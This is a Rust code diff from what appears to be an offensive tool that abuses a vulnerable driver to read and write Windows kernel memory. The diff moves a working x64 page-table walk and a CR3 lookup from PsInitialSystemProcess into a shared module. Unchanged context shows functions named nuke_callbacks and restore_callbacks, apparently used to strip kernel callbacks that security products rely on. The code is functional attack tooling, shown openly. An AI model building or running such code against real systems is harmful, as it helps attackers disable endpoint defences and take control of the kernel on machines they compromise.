@@ -47,178 +47,8 @@ static BACKUPS: Lazy<Mutex<Vec<CallbackBackup>>> = Lazy::new(|| Mutex::new(Vec::
 //---------------------------------------------------------------------------
 // Virtual-to-Physical address translation
 //---------------------------------------------------------------------------
-
-/// Perform a 4-level x64 page-table walk to translate a virtual address
-/// to a physical address.
-///
-/// The walk traverses PML4 → PDPT → PD → PT → physical page.
-/// Each level uses 9 bits of the virtual address as an index into the
-/// current page-table page.  The entry's bits 12..51 give the next-level
-/// physical page frame number (PFN).
-///
-/// # Arguments
-/// * `driver`         — The vulnerable driver in use.
-/// * `device_handle`  — Open handle to the driver's device.
-/// * `cr3`            — Physical address of the PML4 root (from CR3 /
-///                       DirectoryTableBase).  Only bits 12..51 are used.
-/// * `virtual_address`— The virtual address to translate.
-///
-/// # Returns
-/// The corresponding physical address on success.
-fn translate_va_to_pa(
-    driver: &VulnerableDriver,
-    device_handle: usize,
-    cr3: u64,
-    virtual_address: u64,
-) -> Result<u64> {
-    // x64 virtual address layout (4-level paging):
-    //   [63:48] sign extension (must match bit 47)
-    //   [47:39] PML4 index   (9 bits)
-    //   [38:30] PDPT index   (9 bits)
-    //   [29:21] PD index     (9 bits)
-    //   [20:12] PT index     (9 bits)
-    //   [11: 0] page offset  (12 bits)
-
-    let pml4_idx = (virtual_address >> 39) & 0x1FF;
-    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
-    let pd_idx   = (virtual_address >> 21) & 0x1FF;
-    let pt_idx   = (virtual_address >> 12) & 0x1FF;
-    let offset   = virtual_address & 0xFFF;
-
-    // Mask to extract PFN from a page-table entry (bits 12..51).
-    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
-    // Present bit.
-    const PTE_PRESENT: u64 = 1;
-    // Large page bit (PS — bit 7).  When set at PD level → 2 MB page;
-    // at PDPT level → 1 GB page.  No further walk needed.
-    const PTE_PS: u64 = 1 << 7;
-
-    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
-        let mut buf = [0u8; 8];
-        // We must use physical addresses for the page-table walk itself.
-        // deploy::read_physical_memory is safe here because page-table
-        // pages are always at physical addresses.
-        unsafe {
-            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
-        }
-        Ok(u64::from_le_bytes(buf))
-    };
-
-    // Level 1 — PML4
-    let pml4_base = cr3 & PFN_MASK;
-    let pml4e = read_entry(pml4_base, pml4_idx)?;
-    if pml4e & PTE_PRESENT == 0 {
-        bail!(
-            "PML4E not present for VA 0x{:016X} (PML4 base 0x{:016X}, idx {})",
-            virtual_address, pml4_base, pml4_idx
-        );
-    }
-
-    // Level 2 — PDPT
-    let pdpt_base = pml4e & PFN_MASK;
-    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
-    if pdpte & PTE_PRESENT == 0 {
-        bail!(
-            "PDPTE not present for VA 0x{:016X} (PDPT base 0x{:016X}, idx {})",
-            virtual_address, pdpt_base, pdpt_idx
-        );
-    }
-    // 1 GB large page
-    if pdpte & PTE_PS != 0 {
-        let phys = (pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF);
-        return Ok(phys);
-    }
-
-    // Level 3 — PD
-    let pd_base = pdpte & PFN_MASK;
-    let pde = read_entry(pd_base, pd_idx)?;
-    if pde & PTE_PRESENT == 0 {
-        bail!(
-            "PDE not present for VA 0x{:016X} (PD base 0x{:016X}, idx {})",
-            virtual_address, pd_base, pd_idx
-        );
-    }
-    // 2 MB large page
-    if pde & PTE_PS != 0 {
-        let phys = (pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF);
-        return Ok(phys);
-    }
-
-    // Level 4 — PT
-    let pt_base = pde & PFN_MASK;
-    let pte = read_entry(pt_base, pt_idx)?;
-    if pte & PTE_PRESENT == 0 {
-        bail!(
-            "PTE not present for VA 0x{:016X} (PT base 0x{:016X}, idx {})",
-            virtual_address, pt_base, pt_idx
-        );
-    }
-
-    let phys_page = pte & PFN_MASK;
-    Ok(phys_page + offset)
-}
-
-/// Resolve CR3 (DirectoryTableBase) by reading the initial system process.
-///
-/// On x64 Windows the kernel shares a single page-table root (CR3) for all
-/// processes via the _KPROCESS.DirectoryTableBase field.  We resolve
-/// `PsInitialSystemProcess`, read the _EPROCESS, and extract the value at
-/// offset +0x28 (DirectoryTableBase in _KPROCESS, which is the first embedded
-/// struct in _EPROCESS).
-fn resolve_cr3(
-    driver: &VulnerableDriver,
-    device_handle: usize,
-    kernel_base: u64,
-) -> Result<u64> {
-    // Resolve PsInitialSystemProcess — points to the initial _EPROCESS.
-    let eprocess = super::discover::resolve_kernel_symbol(
-        driver,
-        device_handle,
-        kernel_base,
-        "PsInitialSystemProcess",
-    )
-    .context("failed to resolve PsInitialSystemProcess")?;
-
-    // PsInitialSystemProcess is a pointer to _EPROCESS.  Read the pointer.
-    let mut ptr_buf = [0u8; 8];
-    // This first read is a kernel virtual address.  Most drivers handle
-    // VA fine (MmMapIoSpace), so we use the raw address.  If the driver
-    // needs physical addresses, we have a chicken-and-egg problem: we
-    // need CR3 to translate, but we need to read to get CR3.  The
-    // solution is that PsInitialSystemProcess lives in the kernel's
-    // .data section which is mapped 1:1 via the HAL identity mapping
-    // (MmGetPhysicalAddress works even without our translation).
-    unsafe {
-        deploy::read_physical_memory(driver, device_handle, eprocess, &mut ptr_buf)?;
-    }
-    let eprocess_addr = u64::from_le_bytes(ptr_buf);
-
-    if eprocess_addr == 0 {
-        bail!("PsInitialSystemProcess is NULL");
-    }
-
-    // _KPROCESS is embedded at the start of _EPROCESS.
-    // DirectoryTableBase is at _KPROCESS + 0x28 on modern x64 Windows.
-    // (Verified across Windows 10 1607–22H2 and Windows 11.)
-    const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
-    let mut cr3_buf = [0u8; 8];
-    unsafe {
-        deploy::read_physical_memory(
-            driver,
-            device_handle,
-            eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
-            &mut cr3_buf,
-        )?;
-    }
-    let cr3 = u64::from_le_bytes(cr3_buf);
-
-    if cr3 == 0 || cr3 & 0xFFF != 0 {
-        bail!("Invalid CR3 value read from DirectoryTableBase: 0x{:016X}", cr3);
-    }
-
-    log::info!("Resolved CR3 from PsInitialSystemProcess: 0x{:016X}", cr3);
-    Ok(cr3)
-}
+// Shared with discover.rs — see super::translate_va_to_pa() and
+// super::resolve_cr3() in kernel_callback.rs.
 
 /// Read kernel virtual memory, automatically translating VA→PA when the
 /// driver requires physical addresses.
@@ -236,7 +66,7 @@ unsafe fn read_kernel_memory(
         let cr3_val = cr3.context(
             "CR3 required for VA→PA translation with this driver",
         )?;
-        let phys = translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
+        let phys = super::translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
         deploy::read_physical_memory(driver, device_handle, phys, buffer)
     } else {
         deploy::read_physical_memory(driver, device_handle, virtual_address, buffer)
@@ -259,7 +89,7 @@ unsafe fn write_kernel_memory(
         let cr3_val = cr3.context(
             "CR3 required for VA→PA translation with this driver",
         )?;
-        let phys = translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
+        let phys = super::translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
         deploy::write_physical_memory(driver, device_handle, phys, data)
     } else {
         deploy::write_physical_memory(driver, device_handle, virtual_address, data)
@@ -556,7 +386,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
 
     // Step 2: Resolve CR3 if the driver needs physical addresses.
     let cr3 = if driver.needs_physical_addr {
-        Some(resolve_cr3(driver, device_handle, scan.kernel_base)
+        Some(super::resolve_cr3(driver, device_handle, scan.kernel_base)
             .context("failed to resolve CR3 for VA→PA translation")?)
     } else {
         None
@@ -672,7 +502,7 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
     let cr3 = if driver.needs_physical_addr {
         let scan = super::discover::scan_callbacks(deployed).ok();
         if let Some(scan) = scan {
-            Some(resolve_cr3(driver, device_handle, scan.kernel_base)
+            Some(super::resolve_cr3(driver, device_handle, scan.kernel_base)
                 .context("failed to resolve CR3 for VA→PA translation")?)
         } else {
             bail!("Cannot resolve CR3: callback scan failed during restore");
